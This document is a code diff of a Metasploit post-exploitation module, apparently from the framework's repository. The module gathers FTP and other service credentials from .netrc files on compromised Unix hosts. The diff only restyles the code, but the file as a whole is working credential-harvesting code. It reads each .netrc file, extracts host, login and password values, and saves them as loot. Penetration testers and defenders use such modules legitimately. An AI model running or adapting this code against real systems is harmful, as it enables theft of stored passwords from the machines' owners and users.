@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,34 +7,33 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'UNIX Gather .netrc Credentials',
-        'Description'   => %q{
-          Post Module to obtain credentials saved for FTP and other services in .netrc
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
-        'Platform'      => %w{ bsd linux osx unix },
-        'SessionTypes'  => [ 'shell' ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'UNIX Gather .netrc Credentials',
+                      'Description'   => %q(
+                        Post Module to obtain credentials saved for FTP and other services in .netrc
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
+                      'Platform'      => %w(bsd linux osx unix),
+                      'SessionTypes'  => [ 'shell' ]))
   end
 
   def run
     # A table to store the found credentials.
     cred_table = Rex::Text::Table.new(
-    'Header'    => ".netrc credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "Username",
-      "Password",
-      "Server",
-    ])
+      'Header'    => ".netrc credentials",
+      'Indent'    => 1,
+      'Columns'   =>
+      [
+        "Username",
+        "Password",
+        "Server"
+      ]
+    )
 
     # all of the credentials we've found from .netrc
     creds = []
@@ -50,29 +50,25 @@ class MetasploitModule < Msf::Post
           # parse it
           netrc_line.strip!
           # get the machine name
-          if (netrc_line =~ /machine (\S+)/)
+          if netrc_line =~ /machine (\S+)/
             # if we've already found a machine, save this cred and start over
-            if (cred[:host])
+            if cred[:host]
               creds << cred
               cred = {}
             end
-            cred[:host] = $1
+            cred[:host] = Regexp.last_match(1)
           end
           # get the user name
-          if (netrc_line =~ /login (\S+)/)
-            cred[:user] = $1
-          end
+          cred[:user] = Regexp.last_match(1) if netrc_line =~ /login (\S+)/
           # get the password
-          if (netrc_line =~ /password (\S+)/)
-            cred[:pass] = $1
-          end
+          cred[:pass] = Regexp.last_match(1) if netrc_line =~ /password (\S+)/
         end
 
         # save whatever remains of this last cred if it is worth saving
-        creds << cred if (cred[:host] and cred[:user] and cred[:pass])
+        creds << cred if cred[:host] && cred[:user] && cred[:pass]
 
       rescue ::Exception => e
-        print_error("Couldn't read #{netrc_file}: #{e.to_s}")
+        print_error("Couldn't read #{netrc_file}: #{e}")
       end
     end
 
@@ -93,10 +89,10 @@ class MetasploitModule < Msf::Post
         session,
         cred_table.to_csv,
         "netrc_credentials.txt",
-        ".netrc credentials")
+        ".netrc credentials"
+      )
 
-      print_status("Credentials stored in: #{p.to_s}")
+      print_status("Credentials stored in: #{p}")
     end
   end
-
 end
